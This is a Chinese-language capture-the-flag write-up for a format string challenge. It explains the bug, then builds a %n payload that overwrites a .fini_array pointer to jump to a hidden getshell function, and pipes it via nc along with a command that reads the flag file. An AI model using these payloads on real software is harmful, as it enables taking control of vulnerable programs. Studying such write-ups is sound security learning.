一道有趣的pwn题目，来自[浙江大学AAA战队](zjusec.com)(仅限校内访问)

## 题目描述

```shell
Description
Format String Bug
nc 10.214.10.13 11005
cat /data/flag
```

题目的提示链接中给出了一个可执行文件，执行效果和执行`nc 10.214.10.13 11005`是一样的，应该就是服务器端的可执行文件。中间有一段时间可以输入任意字符串，通过构造字符串来执行下面的shell代码。

## 解题过程

* **FormatStringBug**

  先google了一波formatStringbug，找到了Standford一篇[pdf文档](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)，从原理上讲得比较透彻；还有一篇[中文博客](http://www.cnblogs.com/0xJDchen/p/5904816.html)偏重实际操作，两篇结合起来看，容易理解一些。

  中文博客中给出了代码(来自Protostar format3)：

  ```c
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  int target;

  void printbuffer(char *string)
  { 
    printf(string);
  }
   
  void vuln()
  {
    char buffer[512];
    fgets(buffer, sizeof(buffer), stdin);
    printbuffer(buffer);
    if(target == 0x01025544) {
        printf("you have modified the target :)\n");
    } else {
        printf("target is %08x :(\n", target);
    }
  }

  int main(int argc, char **argv)
  {
    vuln();
  }
  ```

  编译的时候需要禁止堆栈保护：

  >gcc without stact protect:  
  >
  >-fstack-protector：启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码。  
  >
  >-fstack-protector-all：启用堆栈保护，为所有函数插入保护代码。  
  >
  >-fno-stack-protector：禁用堆栈保护。

  ```shell
  gcc -fno-stack-protector -g -o formatstring formatstring.c -m32
  ```

  按照博客中说明，可以实现任意地址内容的修改，文中是修改了变量target的值。

* **fsb_easy**

  对于题目中的程序，先用objdump进行反汇编操作：

  ```shell
  objdump -D fsb_easy_i386 > fsb_asm.s
  ```

  得到汇编代码中有一段：

  ```assembly
  0804861f <getshell>:
   804861f:	55                   	push   %ebp
   8048620:	89 e5                	mov    %esp,%ebp
   8048622:	83 ec 08             	sub    $0x8,%esp
   8048625:	83 ec 0c             	sub    $0xc,%esp
   8048628:	68 c8 87 04 08       	push   $0x80487c8
   804862d:	e8 2e fe ff ff       	call   8048460 <system@plt>
   8048632:	83 c4 10             	add    $0x10,%esp
   8048635:	90                   	nop
   8048636:	c9                   	leave  
   8048637:	c3                   	ret    
  ```

  该函数叫做getshell，但是在main函数相关代码中并没有调用它，猜想应该是作者一个比较人性化的设计，想办法劫持pc执行getshell函数，降低题目难度。现在的问题就是如何劫持pc了，斯坦福的pdf文档中提到了很多种可能的利用方式，这里还查到在elf文件的`.fini_array`节保存了函数的指针，通过修改该地址的指向，也可以达到劫持pc的效果。

  汇编代码种可以看到`.fini_array`节的地址是0x8049a68，`getshell`函数的地址是0x804861f，目标是：

  ***0x8049a68 =  0x804861f **

  先查看printf函数的buffer在栈上的偏移：

  ```shell
  AAAA %08x %08x %08x %08x %08x %08x 
  ```

  返回信息为：

  ```
  AAAA 00000200 f7742c20 00000000 41414141 38302520 30252078
  ```

  AAAA相对于当前位置的偏移为4，然后就想办法构造字符串将getshell函数的地址写入.fini_array节的指针中：

  ```shell
  python -c 'print "\x68\x9a\x04\x08\x69\x9a\x04\x08\x6a\x9a\x04\x08\x6b\x9a\x04\x08%.15x%4$n%.103x%5$n%(num1)x%6$n%.(num2)x%7$n"' |./fsb_easy_i386
  ```

  上述代码中`%4$n`表示将栈上第4个位置的内容写为一个整数，整数为前面字符串的长度，`%15x`用于控制字符长度，使得整数是我们想要的值。

  此时栈上第4个位置为0x08049a68，前面共有四个地址16字节+15字节，刚好是31，也就是16进制的1f，之后的值类似（i386地址为小端模式），代码中的num1和num2我隐去了，还是希望读者能自己算一下。

  这样就可以调用程序中的getshell函数了，获取flag的话只要稍微加一句就好了：

  ```shell
  python -c 'print "\x68\x9a\x04\x08\x69\x9a\x04\x08\x6a\x9a\x04\x08\x6b\x9a\x04\x08%.15x%4$n%.103x%5$n%(num1)x%6$n%.(num2)x%7$n"; print "cat /data/flag"' |nc xxx.xxx.xxx.xxx xxxxx
  ```

  ##  Tricks

  * 用管道来输入字符串

    地址中0x0804xxxx这些无法直接输入，这里采用pipline的方式输入("|")，用python格式化字符串来作为后面的输入

  * 用gdb调试程序

    构造字符串的时候结合gdb观察指定地址有没有被修改为想要内容

    * 设置断点：

      ```assembly
      b *0x0804xxxxx
      ```

    * 查看地址内容：

      ```
      p *0x0804xxxx
      ```


    * 用重定向输入字符串

      gdb调试的时候可以先用python把构造好的字符串写入txt文件(大佬们直接用hexedit编辑)，然后用重定向输入：

      ```shell
      (gdb)> r < textfile
      ```

  * 进位问题

    这里构造字符串的时候是从小端开始构造的：0x1f，0x86，0x04，0x08 ；再构造0x04的时候会产生进位貌似会对构造0x08产生影响，本来0x08比0x04多4，那直接构造%4x就好，但是gdb看取1，2，3，4都是0x0b；试着加了256后就正确了。





## 参考文献:

1. https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
2. http://www.cnblogs.com/0xJDchen/p/5904816.html
3. https://samsclass.info/127/proj/p6-fs.htm